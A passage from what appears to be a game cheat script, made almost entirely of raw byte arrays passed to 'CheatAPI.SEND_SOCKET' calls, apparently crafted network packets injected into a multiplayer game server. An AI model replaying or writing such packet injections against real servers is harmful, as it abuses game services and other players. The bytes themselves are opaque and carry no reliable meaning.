22,22,122,124,24,4,104,102,2,23,0,33,0,243,255,203,22,22,122,124,24,4,104,102,2,23,0,32,0,242,255,203,31,23,0,32,0,243,255,203,7,23,0,32,0,244,255,203,7,23,0,32,0,242,255,202,51,23,0,32,0,243,255,202,7,23,0,32,0,244,255,202,7,23,0,32,0,242,255,201,51,23,0,32,0,243,255,201,7,23,0,32,0,244,255,201,7,23,0,32,0,242,255,200,51,23,0,32,0,243,255,200,7,23,0,32,0,244,255,200,7,23,0,32,0,243,255,199,7,23,0,32,0,242,255,199,51,23,0,32,0,244,255,199,7,23,0,40,0,243,255,205,7,23,0,40,0,243,255,206,19,23,0,43,0,243,255,205,7,23,0,43,0,244,255,205,7,23,0,40,0,244,255,205,7,23,0,40,0,244,255,206,19,23,0,43,0,243,255,203,7,23,0,43,0,243,255,202,7,23,0,43,0,243,255,201,7,23,0,43,0,243,255,200,7,23,0,34,0,246,255,213,6,98,123,124,99,79,104,103,78,23,0,34,0,247,255,213,6,98,123,124,99,79,104,103,78,23,255,205,0,165,0,9,23,23,255,205,0,165,0,11,23,23,255,205,0,165,0,12,23,23,255,205,0,165,0,13,23,23,255,205,0,165,0,14,23,23,255,210,0,166,0,10,7,23,255,204,0,166,0,7,31,28,255,204,0,168,0,2,7,28,255,210,0,166,0,14,7,23,255,210,0,167,0,14,7,23,255,210,0,168,0,14,7,23,255,210,0,166,0,13,7,23,255,210,0,166,0,12,7,23,255,210,0,166,0,11,7,23,255,210,0,166,0,9,7,23,255,204,0,166,0,8,31,23,255,204,0,166,0,9,7,23,255,204,0,166,0,10,7,23,255,204,0,166,0,11,7,23,255,204,0,166,0,12,7,23,255,204,0,166,0,13,7,23,255,204,0,166,0,14,7,23,255,204,0,166,0,15,7,23,255,204,0,168,0,1,7,28,255,210,0,166,0,15,7,23,255,205,0,165,0,15,23,23,255,210,0,169,0,14,7,23,255,210,0,167,0,13,7,23,255,210,0,168,0,13,7,23,255,210,0,169,0,13,7,23,255,210,0,167,0,12,7,23,255,210,0,168,0,12,7,12,255,210,0,169,0,12,7,23,255,210,0,167,0,11,7,23,255,210,0,168,0,11,7,23,255,210,0,169,0,11,7,23,255,210,0,167,0,10,7,23,255,210,0,168,0,10,7,23,255,210,0,169,0,10,7,23,255,210,0,167,0,9,7,23,255,210,0,168,0,9,7,23,255,210,0,169,0,9,7,23,255,208,0,168,0,8,15,23,255,207,0,168,0,8,7,2,255,204,0,167,0,8,31,23,255,204,0,168,0,8,15,23,255,204,0,169,0,8,31,23,255,204,0,167,0,9,7,23,255,204,0,168,0,9,7,23,255,204,0,169,0,9,7,23,255,204,0,167,0,10,7,23,255,204,0,168,0,10,7,23,255,204,0,169,0,10,7,23,255,204,0,167,0,11,7,23,255,204,0,168,0,11,7,23,255,204,0,169,0,11,7,23,255,204,0,167,0,12,7,23,255,204,0,168,0,12,7,5,255,204,0,169,0,12,7,23,255,204,0,167,0,13,7,23,255,204,0,168,0,13,7,23,255,204,0,169,0,13,7,23,255,204,0,167,0,14,7,23,255,204,0,168,0,14,7,23,255,204,0,169,0,14,7,23,255,204,0,167,0,15,7,23,255,204,0,169,0,16,31,23,255,210,0,167,0,15,7,23,255,204,0,166,0,16,31,23,255,204,0,167,0,16,31,23,255,204,0,168,0,16,15,23,255,204,0,168,0,15,7,23,255,204,0,169,0,15,7,23,255,204,0,167,0,3,7,28,255,210,0,168,0,15,7,23,255,210,0,169,0,15,7,23,255,207,0,167,0,17,7,23,255,204,0,167,0,4,7,28,255,208,0,168,0,16,15,23,255,204,0,167,0,5,7,28,255,204,0,168,0,0,31,28,255,204,0,169,0,6,7,28,255,204,0,169,0,5,7,28,255,204,0,169,0,4,7,28,255,204,0,168,0,3,7,28,255,204,0,168,0,4,7,28,255,204,0,168,0,5,7,28,255,204,0,168,0,6,7,28,255,204,0,167,0,2,7,28,255,204,0,167,0,1,7,28,255,204,0,166,0,2,31,28,255,204,0,167,0,0,31,28,255,204,0,167,0,6,7,28,255,204,0,166,0,0,31,28,255,204,0,166,0,1,31,28,255,204,0,170,0,7,31,28,255,204,0,169,0,7,31,28,255,204,0,168,0,7,31,28,255,204,0,167,0,7,31,28,255,204,0,166,0,3,31,28,255,204,0,166,0,4,31,28,255,204,0,166,0,5,31,28,255,204,0,166,0,6,31,28,255,204,0,170,0,16,31,23,255,204,0,170,0,15,31,23,255,204,0,170,0,14,31,23,255,204,0,170,0,13,31,23,255,204,0,170,0,12,31,23,255,204,0,170,0,11,31,23,255,204,0,170,0,10,31,23,255,204,0,170,0,9,31,23,255,204,0,170,0,8,31,23,255,204,0,169,0,3,7,28,255,204,0,169,0,2,7,28,255,204,0,169,0,1,7,28,255,204,0,169,0,0,31,28,255,210,0,169,0,6,7,28,255,210,0,169,0,5,6,22,122,124,24,4,104,102,2,28,255,210,0,169,0,4,7,28,255,210,0,169,0,3,7,28,255,210,0,169,0,2,7,28,255,210,0,169,0,1,7,28,255,210,0,168,0,6,7,28,255,210,0,168,0,5,7,28,100,111,1,133,98,0)
//  CheatAPI.SEND_SOCKET(243,4,62,0,3,245,120,0,0,19,136,255,210,0,168,0,4,7,28,255,210,0,168,0,3,7,28,255,210,0,168,0,2,7,28,255,210,0,168,0,1,7,28,255,210,0,167,0,6,7,28,255,210,0,167,0,5,7,28,255,210,0,167,0,4,7,28,255,210,0,167,0,3,7,28,255,210,0,167,0,2,7,28,255,210,0,167,0,1,7,28,255,204,0,170,0,6,31,28,255,204,0,170,0,5,31,28,255,204,0,170,0,4,31,28,255,204,0,170,0,3,31,28,255,204,0,170,0,2,31,28,255,204,0,170,0,1,31,28,255,204,0,170,0,0,31,28,255,211,0,168,0,5,19,23,255,211,0,169,0,5,10,22,122,124,24,4,104,102,2,23,255,211,0,169,0,4,19,23,255,211,0,170,0,5,19,23,255,206,0,168,0,17,7,23,255,208,0,168,0,17,7,23,255,207,0,169,0,17,7,23,255,207,0,168,0,18,7,23,255,213,0,168,0,6,11,23,255,212,0,169,0,6,7,23,255,212,0,169,0,7,19,23,255,215,0,169,0,6,7,23,255,215,0,169,0,5,7,23,255,213,0,170,0,6,11,23,255,209,0,167,255,255,7,28,255,207,0,166,255,255,11,28,255,207,0,167,255,255,7,28,255,208,0,168,255,255,7,28,255,208,0,166,255,254,7,28,255,208,0,167,255,254,7,28,255,213,0,169,0,5,7,23,0,34,0,247,255,197,6,63,63,124,24,4,104,63,63,23,0,0,5,174,62,128,0,0,0,0,64,184,0,0,0,4,0,0,0,0,0,0,12,17,62,0,0,0,0,0,64,184,0,0,0,132,0,0,0,8,0,1,0,0,0,1,6,20,70,71,21,6,61,60,5,23,0,1,0,0,0,0,6,23,73,74,24,9,64,63,8,23,0,1,0,1,0,1,6,15,90,91,41,1,51,50,0,23,0,0,0,1,0,0,6,87,112,109,84,84,109,108,83,2,0,0,0,1,0,1,6,80,105,112,87,81,106,105,80,2,0,1,0,1,0,0,6,17,92,94,19,4,54,53,3,23,0,0,0,0,0,1,6,85,115,111,81,81,106,105,55,23,0,0,0,0,0,0,6,83,113,119,89,59,109,108,83,23,0,0,5,219,62,128,0,0,0,4,15,111,0,0,3,84,0,0,0,53,255,255,0,7,255,252,6,46,120,124,24,19,119,115,41,23,255,255,0,7,0,4,6,20,120,124,48,43,119,115,15,23,255,255,0,10,0,2,6,105,105,109,59,54,104,100,100,50,255,255,0,7,255,253,6,20,120,124,48,43,119,115,15,23,255,255,0,10,255,254,6,55,105,109,109,104,104,100,50,50,255,255,0,10,255,253,6,55,105,109,59,54,104,100,50,50,0,0,0,9,0,3,6,20,96,124,24,4,104,76,0,23,0,0,0,9,255,252,6,20,96,124,24,4,104,76,0,23,0,0,0,9,255,253,6,20,120,98,24,4,78,100,0,23,0,0,0,9,0,4,6,20,120,98,24,4,78,100,0,23,0,0,0,10,0,4,6,5,55,57,8,3,52,50,0,50,0,0,0,10,0,3,6,10,35,39,14,4,54,50,0,54,255,255,0,8,0,4,6,20,120,124,48,28,104,100,0,23,0,0,0,10,0,2,6,5,55,59,9,4,54,50,0,50,255,255,0,9,0,3,6,46,120,124,49,29,104,100,26,23,255,255,0,9,0,4,6,45,120,124,49,29,104,100,25,23,0,0,0,8,0,3,6,20,96,124,24,4,104,76,0,23,255,255,0,7,0,3,6,46,120,124,24,19,119,115,41,23,255,255,0,9,255,251,6,30,55,69,44,29,54,50,25,50,255,255,0,8,255,253,6,20,120,124,48,28,104,100,0,23,255,255,0,8,0,3,6,46,120,124,24,4,104,100,26,23,255,255,0,8,255,252,6,46,120,124,24,4,104,100,26,23,255,255,0,9,255,253,6,45,120,124,48,28,104,100,25,23,255,255,0,9,255,252,6,45,120,124,49,29,104,100,25,23,0,0,0,7,255,253,6,20,70,48,23,3,28,50,0,50,0,0,0,8,255,253,6,20,120,98,24,4,78,100,0,23,0,0,0,7,255,252,6,21,46,74,24,4,54,26,1,50,0,0,0,8,255,252,6,20,96,124,24,4,104,76,0,23,0,0,0,7,0,3,6,21,46,74,24,9,59,31,6,50,0,0,0,7,0,4,6,20,70,48,23,8,33,55,5,50,255,255,0,9,0,5,6,40,65,59,34,29,54,50,25,50,0,0,0,8,0,4,6,20,120,98,24,4,78,100,0,23,255,255,0,9,0,1,6,70,120,124,74,69,114,110,65,23,0,0,0,9,0,0,6,20,70,74,24,4,79,75,0,53,0,0,0,9,0,1,6,20,115,117,22,2,102,100,0,50,0,0,0,9,255,255,6,22,117,119,24,4,104,102,2,50,0,0,0,8,255,255,6,23,73,74,24,4,54,53,3,53,0,0,0,8,0,0,6,20,70,74,24,4,54,50,0,53,0,0,0,8,0,1,6,20,70,71,21,1,51,50,0,53,255,255,0,10,0,3,6,55,105,109,59,54,104,100,50,50,255,255,0,10,0,4,6,55,105,108,57,52,103,100,50,50,0,0,0,10,0,1,6,45,70,59,34,29,54,60,35,50,0,0,0,10,0,0,6,40,65,69,44,29,54,50,25,53,0,0,0,10,255,255,6,30,55,74,49,39,64,50,25,50,0,0,0,10,255,254,6,5,55,59,9,4,54,50,0,50,0,0,0,10,255,253,6,10,35,39,14,4,54,50,0,54,255,255,0,10,255,252,6,57,106,109,59,54,104,101,52,50,0,0,0,10,255,252,6,6,57,59,9,4,54,52,1,50,255,255,0,9,255,255,6,70,120,124,74,69,114,110,65,53,0,1,0,9,0,1,6,15,40,42,17,2,27,25,0,50,0,1,0,9,255,255,6,17,42,44,19,4,29,27,2,21,0,1,0,8,255,255,6,22,47,49,24,4,29,27,2,50,0,1,0,8,0,1,6,20,45,47,22,2,27,25,0,50,0,0,5,237,63,128,0,0,0,4,15,111,0,0,0,36,0,0,0,4,255,253,0,0,0,0,19,23,255,253,0,0,0,1,19,23,255,253,0,0,0,2,19,23,255,253,0,0,0,3,19,23,0,0,5,238,63,128,0,0,0,4,15,111,0,0,0,132,0,0,0,16,255,252,0,0,0,1,11,23,255,252,0,0,0,2,11,23,255,252,0,0,0,3,35,23,255,252,0,0,0,4,35,23,255,252,255,255,0,4,19,23,255,252,255,255,0,3,19,23,255,252,255,255,0,2,11,23,255,252,255,255,0,1,11,23,255,252,255,254,0,3,19,23,255,252,255,253,0,3,19,23,255,252,255,254,0,4,19,23,255,252,255,253,0,4,19,23,255,252,255,254,0,2,11,23,255,252,255,254,0,1,11,23,255,252,255,253,0,1,11,23,255,252,255,253,0,2,11,23,0,0,6,7,63,128,0,0,0,4,15,111,0,0,0,4,0,0,0,0,0,0,6,23,63,128,0,0,0,4,15,111,0,0,2,164,0,0,0,84,0,0,0,0,0,0,7,7,0,0,0,0,0,1,7,7,0,0,0,0,0,2,7,7,255,237,0,19,0,3,7,7,255,255,0,1,0,0,7,7,255,255,0,1,0,1,7,7,255,255,0,1,0,2,7,7,255,252,0,4,0,0,7,7,255,254,0,2,0,0,7,7,255,254,0,2,0,1,7,7,255,254,0,2,0,2,7,7,255,242,0,14,0,0,7,7,255,253,0,3,0,0,7,7,255,253,0,3,0,1,7,7,255,251,0,5,0,0,7,7,255,253,0,3,0,2,7,7,255,241,0,15,0,0,7,7,255,250,0,6,0,0,7,7,255,236,0,20,0,1,7,7,255,249,0,7,0,0,7,7,255,242,0,14,0,1,7,7,255,248,0,8,0,0,7,7,255,240,0,16,0,0,7,7,255,247,0,9,0,0,7,7,255,242,0,14,0,2,7,7,255,246,0,10,0,0,7,7,255,241,0,15,0,1,7,7,255,245,0,11,0,0,7,7,255,241,0,15,0,2,7,7,255,244,0,12,0,0,7,7,255,240,0,16,0,1,7,7,255,243,0,13,0,0,7,7,255,253,0,3,0,3,7,7,255,252,0,4,0,1,7,7,255,252,0,4,0,2,7,7,255,251,0,5,0,1,7,7,255,251,0,5,0,2,7,7,255,250,0,6,0,1,7,7,255,250,0,6,0,2,7,7,255,249,0,7,0,1,7,7,255,249,0,7,0,2,7,7,255,248,0,8,0,1,7,7,255,248,0,8,0,2,7,7,255,247,0,9,0,1,7,7,255,247,0,9,0,2,7,7,255,246,0,10,0,1,7,7,255,246,0,10,0,2,7,7,255,245,0,11,0,1,7,7,255,245,0,11,0,2,7,7,255,244,0,12,0,1,7,7,255,244,0,12,0,2,7,7,255,243,0,13,0,1,7,7,255,243,0,13,0,2,7,7,255,240,0,16,0,2,7,7,255,239,0,17,0,3,7,7,255,240,0,16,0,3,7,7,255,247,0,9,0,3,7,7,255,248,0,8,0,3,7,7,255,237,0,19,0,1,7,7,255,237,0,19,0,2,7,7,255,254,0,2,0,3,7,7,255,239,0,17,0,1,7,7,255,238,0,18,0,1,7,7,255,249,0,7,0,3,7,7,255,246,0,10,0,3,7,7,255,238,0,18,0,3,7,7,255,236,0,20,0,3,7,7,255,255,0,1,0,3,7,7,255,251,0,5,0,3,7,7,255,239,0,17,0,0,7,7,255,241,0,15,0,3,7,7,255,250,0,6,0,3,7,7,255,252,0,4,0,3,7,7,255,237,0,19,0,0,7,7,255,239,0,17,0,2,7,7,0,0,0,0,0,3,7,7,255,243,0,13,0,3,7,7,255,236,0,20,0,2,7,7,255,238,0,18,0,2,7,7,255,236,0,20,0,0,7,7,255,238,0,18,0,0,7,7,255,242,0,14,0,3,7,7,255,245,0,11,0,3,7,7,255,244,0,12,0,3,7,7,0,0,6,24,63,128,0,0,0,4,15,111,0,0,2,164,0,0,0,84,255,242,0,0,255,253,63,7,255,242,0,3,0,0,63,7,255,248,0,0,0,10,11,7,255,248,0,0,0,11,11,7,255,242,0,1,255,253,63,7,255,242,0,2,255,253,7,7,0,0,0,2,0,0,7,7,0,0,0,2,255,253,7,7,255,244,0,1,0,3,19,7,255,244,255,254,0,3,19,7,255,242,0,3,255,255,63,7,255,250,0,1,0,0,31,7,255,244,255,253,0,1,19,7,255,244,0,2,0,0,7,7,255,242,0,3,255,253,63,7,255,242,0,3,255,254,63,7,255,250,0,2,0,0,7,7,255,252,0,2,0,0,7,7,255,254,0,2,0,0,7,7,255,244,255,254,0,2,7,7,255,244,255,253,0,2,19,7,255,244,0,2,255,253,7,7,255,244,255,253,0,3,19,7,255,246,0,2,255,253,7,7,255,248,0,2,255,253,7,7,255,250,0,2,255,253,7,7,255,252,0,2,255,253,7,7,255,244,255,254,0,1,7,7,255,254,0,2,255,253,7,7,255,249,0,0,0,12,7,7,255,247,0,0,0,4,19,7,255,247,0,0,0,5,19,7,255,247,0,0,0,6,19,7,255,247,0,0,0,7,19,7,255,247,0,0,0,8,19,7,255,247,0,0,0,9,19,7,255,244,0,0,0,3,31,7,255,247,0,1,0,9,7,7,255,244,255,254,0,0,19,7,255,250,0,1,0,9,7,7,255,244,0,0,0,2,31,7,255,247,0,1,0,4,7,7,255,247,0,1,0,5,7,7,255,247,0,1,0,6,7,7,255,247,0,1,0,7,7,7,255,247,0,1,0,8,7,7,255,250,0,1,0,1,7,7,255,250,0,1,0,2,7,7,255,250,0,1,0,3,7,7,255,250,0,1,0,4,7,7,255,250,0,1,0,5,7,7,255,250,0,1,0,6,7,7,255,250,0,1,0,7,7,7,255,250,0,1,0,8,7,7,255,250,0,2,0,8,7,7,255,247,255,255,0,3,7,7,255,250,0,2,0,6,7,7,255,250,0,2,0,4,7,7,255,244,255,253,0,0,19,7,255,250,0,2,0,2,7,7,255,247,0,2,0,8,7,7,255,247,0,2,0,6,7,7,255,247,0,2,0,4,7,7,255,244,0,0,0,1,7,7,255,244,0,1,0,2,7,7,255,247,255,255,0,0,7,7,255,244,255,255,0,0,7,7,255,247,0,3,0,4,19,7,255,247,0,3,0,5,19,7,255,247,0,3,0,6,19,7,255,247,0,3,0,7,19,7,255,244,0,1,0,1,7,7,255,249,0,3,0,8,11,7,255,242,0,0,0,0,63,7,255,242,0,1,0,0,15,7,255,242,0,2,0,0,7,7,255,238,0,0,255,254,79,7,255,239,0,0,255,255,75,7,255,247,255,254,0,1,7,7,255,247,255,254,0,2,7,7,255,246,0,0,0,1,23,7,255,244,0,3,0,1,31,7,255,244,0,3,0,2,31,7,255,244,0,3,0,3,31,7,0,0,6,25,63,128,0,0,0,4,15,111,0,0,2,164,0,0,0,84,0,0,0,0,0,0,7,10,0,0,0,0,0,1,7,10,0,0,0,0,0,2,7,10,255,237,0,19,0,3,7,10,255,255,0,1,0,0,7,10,255,255,0,1,0,1,7,10,255,255,0,1,0,2,7,10,255,252,0,4,0,0,7,10,255,254,0,2,0,0,7,10,255,254,0,2,0,1,7,10,255,254,0,2,0,2,7,10,255,242,0,14,0,0,7,10,255,253,0,3,0,0,7,10,255,253,0,3,0,1,7,10,255,251,0,5,0,0,7,10,255,253,0,3,0,2,7,10,255,241,0,15,0,0,7,10,255,250,0,6,0,0,7,10,255,236,0,20,0,1,7,10,255,249,0,7,0,0,7,10,255,242,0,14,0,1,7,10,255,248,0,8,0,0,7,10,255,240,0,16,0,0,7,10,255,247,0,9,0,0,7,10,255,242,0,14,0,2,7,10,255,246,0,10,0,0,7,10,255,241,0,15,0,1,7,10,255,245,0,11,0,0,7,10,255,241,0,15,0,2,7,10,255,244,0,12,0,0,7,10,255,240,0,16,0,1,7,10,255,243,0,13,0,0,7,10,255,253,0,3,0,3,7,10,255,252,0,4,0,1,7,10,255,252,0,4,0,2,7,10,255,251,0,5,0,1,7,10,255,251,0,5,0,2,7,10,255,250,0,6,0,1,7,10,255,250,0,6,0,2,7,10,255,249,0,7,0,1,7,10,255,249,0,7,0,2,7,10,255,248,0,8,0,1,7,10,255,248,0,8,0,2,7,10,255,247,0,9,0,1,7,10,255,247,0,9,0,2,7,10,255,246,0,10,0,1,7,10,255,246,0,10,0,2,7,10,255,245,0,11,0,1,7,10,255,245,0,11,0,2,7,10,255,244,0,12,0,1,7,10,255,244,0,12,0,2,7,10,255,243,0,13,0,1,7,10,255,243,0,13,0,2,7,10,255,240,0,16,0,2,7,10,255,239,0,17,0,3,7,10,255,240,0,16,0,3,7,10,255,247,0,9,0,3,7,10,255,248,0,8,0,3,7,10,255,237,0,19,0,1,7,10,255,237,0,19,0,2,7,10,255,254,0,2,0,3,7,10,255,239,0,17,0,1,7,10,255,238,0,18,0,1,7,10,255,249,0,7,0,3,7,10,255,246,0,10,0,3,7,10,255,238,0,18,0,3,7,10,255,236,0,20,0,3,7,10,255,255,0,1,0,3,7,10,255,251,0,5,0,3,7,10,255,239,0,17,0,0,7,10,255,241,0,15,0,3,7,10,255,250,0,6,0,3,7,10,255,252,0,4,0,3,7,10,255,237,0,19,0,0,7,10,255,239,0,17,0,2,7,10,0,0,0,0,0,3,7,10,255,243,0,13,0,3,7,10,255,236,0,20,0,2,7,10,255,238,0,18,0,2,7,10,255,236,0,20,0,0,7,10,255,238,0,18,0,0,7,10,255,242,0,14,0,3,7,10,255,245,0,11,0,3,7,10,255,244,0,12,0,3,7,10,0,0,6,26,63,128,0,0,0,4,15,111,0,0,2,164,0,0,0,84,0,0,0,0,0,0,7,2,0,0,0,0,0,1,7,2,0,0,0,0,0,2,7,2,255,237,0,19,0,3,7,2,255,255,0,1,0,0,7,2,255,255,0,1,0,1,7,2,255,255,0,1,0,2,7,2,255,252,0,4,0,0,7,2,255,254,0,2,0,0,7,2,255,254,0,2,0,1,7,2,255,254,0,2,0,2,7,2,255,242,0,14,0,0,7,2,255,253,0,3,0,0,7,2,255,253,0,3,0,1,7,2,255,251,0,5,0,0,7,2,255,253,0,3,0,2,7,2,255,241,0,15,0,0,7,2,255,250,0,6,0,0,7,2,255,236,0,20,0,1,7,2,255,249,0,7,0,0,7,2,255,242,0,14,0,1,7,2,255,248,0,8,0,0,7,2,255,240,0,16,0,0,7,2,255,247,0,9,0,0,7,2,255,242,0,14,0,2,7,2,255,246,0,10,0,0,7,2,255,241,0,15,0,1,7,2,255,245,0,11,0,0,7,2,255,241,0,15,0,2,7,2,255,244,0,12,0,0,7,2,255,240,0,16,0,1,7,2,255,243,0,13,0,0,7,2,255,253,0,3,0,3,7,2,255,252,0,4,0,1,7,2,255,252,0,4,0,2,7,2,255,251,0,5,0,1,7,2,255,251,0,5,0,2,7,2,255,250,0,6,0,1,7,2,255,250,0,6,0,2,7,2,255,249,0,7,0,1,7,2,255,249,0,7,0,2,7,2,255,248,0,8,0,1,7,2,255,248,0,8,0,2,7,2,255,247,0,9,0,1,7,2,255,247,0,9,0,2,7,2,255,246,0,10,0,1,7,2,255,246,0,10,0,2,7,2,255,245,0,11,0,1,7,2,255,245,0,11,0,2,7,2,255,244,0,12,0,1,7,2,255,244,0,12,0,2,7,2,255,243,0,13,0,1,7,2,255,243,0,13,0,2,7,2,255,240,0,16,0,2,7,2,255,239,0,17,0,3,7,2,255,240,0,16,0,3,7,2,255,247,0,9,0,3,7,2,255,248,0,8,0,3,7,2,255,237,0,19,0,1,7,2,255,237,0,19,0,2,7,2,255,254,0,2,0,3,7,2,255,239,0,17,0,1,7,2,255,238,0,18,0,1,7,2,255,249,0,7,0,3,7,2,255,246,0,10,0,3,7,2,255,238,0,18,0,3,7,2,255,236,0,20,0,3,7,2,255,255,0,1,0,3,7,2,255,251,0,5,0,3,7,2,255,239,0,17,0,0,7,2,255,241,0,15,0,3,7,2,255,250,0,6,0,3,7,2,255,252,0,4,0,3,7,2,255,237,0,19,0,0,7,2,255,239,0,17,0,2,7,2,0,0,0,0,0,3,7,2,255,243,0,13,0,3,7,2,255,236,0,20,0,2,7,2,255,238,0,18,0,2,7,2,255,236,0,20,0,0,7,2,255,238,0,18,0,0,7,2,255,242,0,14,0,3,7,2,255,245,0,11,0,3,7,2,255,244,0,12,0,3,7,2,0,0,6,27,63,128,0,0,0,4,15,111,0,0,2,164,0,0,0,84,0,0,0,0,0,0,7,15,0,0,0,0,0,1,7,15,0,0,0,0,0,2,7,15,255,237,0,19,0,3,7,15,255,255,0,1,0,0,7,15,255,255,0,1,0,1,7,15,255,255,0,1,0,2,7,15,255,252,0,4,0,0,7,15,255,254,0,2,0,0,7,15,255,254,0,2,0,1,7,15,255,254,0,2,0,2,7,15,255,242,0,14,0,0,7,15,255,253,0,3,0,0,7,15,255,253,0,3,0,1,7,15,255,251,0,5,0,0,7,15,255,253,0,3,0,2,7,15,255,241,0,15,0,0,7,15,255,250,0,6,0,0,7,15,255,236,0,20,0,1,7,15,255,249,0,7,0,0,7,15,255,242,0,14,0,1,7,15,255,248,0,8,0,0,7,15,255,240,0,16,0,0,7,15,255,247,0,9,0,0,7,15,255,242,0,14,0,2,7,15,255,246,0,10,0,0,7,15,255,241,0,15,0,1,7,15,255,245,0,11,0,0,7,15,255,241,0,15,0,2,7,15,255,244,0,12,0,0,7,15,255,240,0,16,0,1,7,15,255,243,0,13,0,0,7,15,255,253,0,3,0,3,7,15,255,252,0,4,0,1,7,15,255,252,0,4,0,2,7,15,255,251,0,5,0,1,7,15,255,251,0,5,0,2,7,15,255,250,0,6,0,1,7,15,255,250,0,6,0,2,7,15,255,249,0,7,0,1,7,15,255,249,0,7,0,2,7,15,255,248,0,8,0,1,7,15,255,248,0,8,0,2,7,15,255,247,0,9,0,1,7,15,255,247,0,9,0,2,7,15,255,246,0,10,0,1,7,15,255,246,0,10,0,2,7,15,255,245,0,11,0,1,7,15,255,245,0,11,0,2,7,15,255,244,0,12,0,1,7,15,255,244,0,12,0,2,7,15,255,243,0,13,0,1,7,15,255,243,0,13,0,2,7,15,255,240,0,16,0,2,7,15,255,239,0,17,0,3,7,15,255,240,0,16,0,3,7,15,255,247,0,9,0,3,7,15,255,248,0,8,0,3,7,15,255,237,0,19,0,1,7,15,255,237,0,19,0,2,7,15,255,254,0,2,0,3,7,15,255,239,0,17,0,1,7,15,255,238,0,18,0,1,7,15,255,249,0,7,0,3,7,15,255,246,0,10,0,3,7,15,255,238,0,18,0,3,7,15,255,236,0,20,0,3,7,15,255,255,0,1,0,3,7,15,255,251,0,5,0,3,7,15,255,239,0,17,0,0,7,15,255,241,0,15,0,3,7,15,255,250,0,6,0,3,7,15,255,252,0,4,0,3,7,15,255,237,0,19,0,0,7,15,255,239,0,17,0,2,7,15,0,0,0,0,0,3,7,15,255,243,0,13,0,3,7,15,255,236,0,20,0,2,7,15,255,238,0,18,100,111,1,133,98,0)
//  CheatAPI.SEND_SOCKET(243,4,62,0,3,245,120,0,0,19,136,0,2,7,15,255,236,0,20,0,0,7,15,255,238,0,18,0,0,7,15,255,242,0,14,0,3,7,15,255,245,0,11,0,3,7,15,255,244,0,12,0,3,7,15,0,0,6,28,63,128,0,0,0,4,15,111,0,0,2,196,0,0,0,88,255,242,0,0,255,253,63,10,255,245,0,0,0,0,51,10,255,244,0,0,0,0,7,7,255,242,0,3,0,0,63,10,255,248,0,0,0,3,15,10,255,248,0,0,0,10,11,10,255,248,0,0,0,11,11,10,255,242,0,1,255,253,63,10,255,242,0,2,255,253,7,10,0,0,0,2,0,0,7,10,0,0,0,2,255,253,7,10,255,244,0,1,0,3,19,10,255,244,255,254,0,3,19,10,255,242,0,3,255,255,63,10,255,250,0,1,0,0,31,10,255,244,255,253,0,1,19,10,255,244,0,2,0,0,7,10,255,242,0,3,255,253,63,10,255,242,0,3,255,254,63,10,255,250,0,2,0,0,7,10,255,252,0,2,0,0,7,10,255,254,0,2,0,0,7,10,255,244,255,254,0,2,7,10,255,244,255,253,0,2,19,10,255,244,0,2,255,253,7,10,255,244,255,253,0,3,19,10,255,246,0,2,255,253,7,10,255,248,0,2,255,253,7,10,255,250,0,2,255,253,7,10,255,252,0,2,255,253,7,10,255,244,255,254,0,1,7,10,255,254,0,2,255,253,7,10,255,249,0,0,0,12,7,10,255,247,0,0,0,3,7,7,255,247,0,0,0,4,19,10,255,247,0,0,0,5,19,10,255,247,0,0,0,6,19,10,255,247,0,0,0,7,19,10,255,247,0,0,0,8,19,10,255,247,0,0,0,9,19,10,255,244,0,0,0,3,15,10,255,247,0,1,0,9,7,10,255,244,255,254,0,0,19,10,255,250,0,1,0,9,7,10,255,244,0,0,0,2,31,10,255,247,0,1,0,4,7,10,255,247,0,1,0,5,7,10,255,247,0,1,0,6,7,10,255,247,0,1,0,7,7,10,255,247,0,1,0,8,7,10,255,250,0,1,0,1,7,10,255,250,0,1,0,2,7,10,255,250,0,1,0,3,7,10,255,250,0,1,0,4,7,10,255,250,0,1,0,5,7,10,255,250,0,1,0,6,7,10,255,250,0,1,0,7,7,10,255,250,0,1,0,8,7,10,255,250,0,2,0,8,7,10,255,247,255,255,0,3,7,10,255,250,0,2,0,6,7,10,255,250,0,2,0,4,7,10,255,244,255,253,0,0,19,10,255,250,0,2,0,2,7,10,255,247,0,2,0,8,7,10,255,247,0,2,0,6,7,10,255,247,0,2,0,4,7,10,255,244,0,0,0,1,7,10,255,244,0,1,0,2,7,10,255,247,255,255,0,0,7,10,255,244,255,255,0,0,7,10,255,247,0,3,0,4,19,10,255,247,0,3,0,5,19,10,255,247,0,3,0,6,19,10,255,247,0,3,0,7,19,10,255,244,0,1,0,1,7,10,255,249,0,3,0,8,11,10,255,242,0,0,0,0,11,10,255,242,0,1,0,0,15,10,255,242,0,2,0,0,7,10,255,238,0,0,255,254,79,10,255,239,0,0,255,255,75,10,255,247,255,254,0,1,7,10,255,247,255,254,0,2,7,10,255,246,0,0,0,1,23,10,255,244,0,3,0,1,31,10,255,244,0,3,0,2,31,10,255,244,0,3,0,3,31,10,0,0,6,29,63,128,0,0,0,4,15,111,0,0,2,196,0,0,0,88,255,242,0,0,255,253,63,2,255,245,0,0,0,0,51,2,255,244,0,0,0,0,7,7,255,242,0,3,0,0,63,2,255,248,0,0,0,3,15,2,255,248,0,0,0,10,11,2,255,248,0,0,0,11,11,2,255,242,0,1,255,253,63,2,255,242,0,2,255,253,7,2,0,0,0,2,0,0,7,2,0,0,0,2,255,253,7,2,255,244,0,1,0,3,19,2,255,244,255,254,0,3,19,2,255,242,0,3,255,255,63,2,255,250,0,1,0,0,31,2,255,244,255,253,0,1,19,2,255,244,0,2,0,0,7,2,255,242,0,3,255,253,63,2,255,242,0,3,255,254,63,2,255,250,0,2,0,0,7,2,255,252,0,2,0,0,7,2,255,254,0,2,0,0,7,2,255,244,255,254,0,2,7,2,255,244,255,253,0,2,19,2,255,244,0,2,255,253,7,2,255,244,255,253,0,3,19,2,255,246,0,2,255,253,7,2,255,248,0,2,255,253,7,2,255,250,0,2,255,253,7,2,255,252,0,2,255,253,7,2,255,244,255,254,0,1,7,2,255,254,0,2,255,253,7,2,255,249,0,0,0,12,7,2,255,247,0,0,0,3,7,7,255,247,0,0,0,4,19,2,255,247,0,0,0,5,19,2,255,247,0,0,0,6,19,2,255,247,0,0,0,7,19,2,255,247,0,0,0,8,19,2,255,247,0,0,0,9,19,2,255,244,0,0,0,3,15,2,255,247,0,1,0,9,7,2,255,244,255,254,0,0,19,2,255,250,0,1,0,9,7,2,255,244,0,0,0,2,31,2,255,247,0,1,0,4,7,2,255,247,0,1,0,5,7,2,255,247,0,1,0,6,7,2,255,247,0,1,0,7,7,2,255,247,0,1,0,8,7,2,